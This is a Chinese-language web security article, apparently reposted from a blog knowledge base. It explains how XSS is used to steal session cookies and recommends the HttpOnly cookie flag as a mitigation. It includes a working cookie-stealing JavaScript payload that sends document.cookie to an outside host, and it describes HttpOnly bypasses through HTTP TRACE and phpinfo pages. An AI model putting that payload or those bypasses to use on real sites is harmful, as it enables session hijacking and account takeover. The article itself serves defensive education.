[原文链接](http://kb.cnblogs.com/page/115136/)
	随着www服务的兴起，越来越多的应用程序转向了B/S结构，这样只需要一个浏览器就可以访问各种各样的web服务，但是这样也越来越导致了越来越多的web安全问题。www服务依赖于Http协议实现，Http是无状态的协议，所以为了在各个会话之间传递信息，就不可避免地用到Cookie或者Session等技术来标记访问者的状态，而无论是Cookie还是Session，一般都是利用Cookie来实现的(Session其实是在浏览器的Cookie里带了一个Token来标记，服务器取得了这个Token并且检查合法性之后就把服务器上存储的对应的状态和浏览器绑定)，这样就不可避免地安全聚焦到了Cookie上面，只要获得这个Cookie，就可以取得别人的身份，这对于入侵者是一件很美妙的事情，特别当获得的Cookie属于管理员等高权限身份者时，危害就更大了。在各种web安全问题里，其中xss漏洞就因此显得格外危险。
	对于应用程序来说，一旦存在了xss漏洞就意味着别人可以在你的浏览器中执行任意的js脚本，如果应用程序是开源的或者功能是公开的话，别人就可以利用ajax使用这些功能，但是过程往往很烦琐，特别是想直接获得别人身份做随意浏览的话困难就更大。而对于不开源的应用程序，譬如某些大型站点的web后台(web2.0一个显著的特征就是大量的交互，用户往往需要跟后台的管理员交互，譬如Bug汇报，或者信息投递等等)，尽管因为交互的存在可能存在跨站脚本漏洞，但是因为对后台的不了解，无法构造完美的ajax代码来利用，即使可以用js取得后台的代码并回传分析，但是过程同样烦琐而且不隐蔽。这个时候，利用xss漏洞获得Cookie或者Session劫持就很有效了，具体分析应用程序的认证，然后使用某些技巧，甚至可以即使对方退出程序也一样永久性获得对方的身份。
	那么如何获得Cookie或者Session劫持呢?在浏览器中的document对象中，就储存了Cookie的信息，而利用js可以把这里面的Cookie给取出来，只要得到这个Cookie就可以拥有别人的身份了。一个很典型的xss攻击语句如下：
````  
　　xss exp:
　　url=document.top.location.href;
　　cookie=document.cookie;
　　c=new Image();
　　c.src=’http://www.loveshell.net/c.php?c=’+cookie+’&u=’+url;
````  

　　一些应用程序考虑到这个问题所在，所以可能会采取浏览器绑定技术，譬如将Cookie和浏览器的User-agent绑定，一旦发现修改就认为Cookie失效。这种方法已经证明是无效的，因为当入侵者偷得Cookie的同时他肯定已经同时获得了User-agent。还有另外一种比较严格的是将Cookie和Remote-addr相绑定(其实就是和IP绑定，但是一些程序取得IP的方法有问题一样导致饶过)，但是这样就带来很差的用户体验，更换IP是经常的事，譬如上班与家里就是2个IP，所以这种方法往往也不给予采用。所以基于Cookie的攻击方式现在就非常流行，在一些web 2.0站点很容易就取到应用程序的管理员身份。
　　
	如何保障我们的敏感Cookie安全呢?通过上面的分析，一般的Cookie都是从document对象中获得的，我们只要让敏感Cookies浏览器document中不可见就行了。很幸运，现在浏览器在设置Cookie的时候一般都接受一个叫做HttpOnly的参数，跟domain等其他参数一样，一旦这个HttpOnly被设置，你在浏览器的document对象中就看不到Cookie了，而浏览器在浏览的时候不受任何影响，因为Cookie会被放在浏览器头中发送出去(包括ajax的时候)，应用程序也一般不会在js里操作这些敏感Cookie的，对于一些敏感的Cookie我们采用HttpOnly，对于一些需要在应用程序中用js操作的cookie我们就不予设置，这样就保障了Cookie信息的安全也保证了应用。关于HttpOnly说明可以参照 http://msdn2.microsoft.com/en-us/library/ms533046.aspx。

　　给浏览器设置Cookie的头如下：
````  
	Set-Cookie: =[; =]
　　[; expires=][; domain=]
　　[; path=][; secure][; HttpOnly]
````     　　

以php为例，在php 5.2版本时就已经在Setcookie函数加入了对HttpOnly的支持，譬如：
````    
	setcookie("abc","test",NULL,NULL,NULL,NULL,TRUE);
````    
　　
	就可以设置abc这个cookie，将其设置为HttpOnly，document将不可见这个Cookie。因为setcookie函数本质就是个header，所以一样可以使用header来设置HttpOnly。然后再使用document.cookie就可以看到已经取不到这个Cookie了。我们用这种方法来保护利例如Sessionid，如一些用于认证的auth-cookie，就不用担心身份被人获得了，这对于一些后台程序和webmail提升安全性的意义是重大的。再次使用上面的攻击手法时可以看到，已经不能获取被我们设置为HttpOnly的敏感Cookie了。
	但是，也可以看到HttpOnly并不是万能的，首先它并不能解决xss的问题，仍然不能抵制一些有耐心的黑客的攻击，也不能防止入侵者做ajax提交，甚至一些基于xss的proxy也出现了，但是已经可以提高攻击的门槛了，起码xss攻击不是每个脚本小子都能完成的了，而且其他的那些攻击手法因为一些环境和技术的限制，并不像Cookie窃取这种手法一样通用。
	HttpOnly也是可能利用一些漏洞或者配置Bypass的，关键问题是只要能取到浏览器发送的Cookie头就可以了。譬如以前出现的Http Trace攻击就可以将你的Header里的Cookie回显出来，利用ajax或者flash就可以完成这种攻击，这种手法也已经在ajax和flash中获得修补。另外一个关于配置或者应用程序上可能Bypass的显著例子就是phpinfo，大家知道phpinfo会将浏览器发送的http头回显出来，其中就包括我们保护的auth信息，而这个页面经常存在在各种站点上，只要用ajax取phpinfo页面，取出header头对应的部分就可以获得Cookie了。一些应用程序的不完善也可能导致header头的泄露，这种攻击方式对于basic验证保护的页面一样可以攻击。
	HttpOnly在IE 6以上，Firefox较新版本都得到了比较好的支持，并且在如Hotmail等应用程序里都有广泛的使用，并且已经是取得了比较好的安全效果。
